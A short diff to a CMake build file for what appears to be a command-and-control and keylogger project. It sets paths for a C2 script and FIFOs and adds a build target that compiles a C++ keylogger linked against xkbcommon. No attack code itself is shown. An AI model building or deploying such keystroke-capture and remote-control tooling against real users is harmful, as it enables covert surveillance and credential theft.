@@ -17,7 +17,7 @@ set(BIN_DIR ${CMAKE_SOURCE_DIR}/bin)
 set(C2_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/c2_terminal.py)
 set(C2_IN_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_in_fifo)
 set(C2_OUT_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_out_fifo)
-set(KEYLOGGER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal.py)
+set(KEYLOGGER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal)
 set(KEYLOGGER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/keylogger_fifo)
 
 # Output directory for binaries
@@ -41,3 +41,13 @@ add_executable(client ${CLIENT_SRC_FILES})
 target_include_directories(client PRIVATE ${CLIENT_INCLUDE_DIR} ${COMMON_INCLUDE_DIR})
 find_package(Threads REQUIRED)
 target_link_libraries(client PRIVATE Threads::Threads)
+
+# Keylogger Terminal target
+file(GLOB_RECURSE KEYLOGGER_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal.cpp)
+add_executable(keylogger_terminal ${KEYLOGGER_SRC_FILE})
+find_package(PkgConfig REQUIRED)
+pkg_check_modules(XKBCOMMON REQUIRED xkbcommon)
+target_link_libraries(keylogger_terminal PRIVATE ${XKBCOMMON_LIBRARIES})
+target_include_directories(keylogger_terminal PRIVATE ${XKBCOMMON_INCLUDE_DIRS})
+
+set_target_properties(keylogger_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)
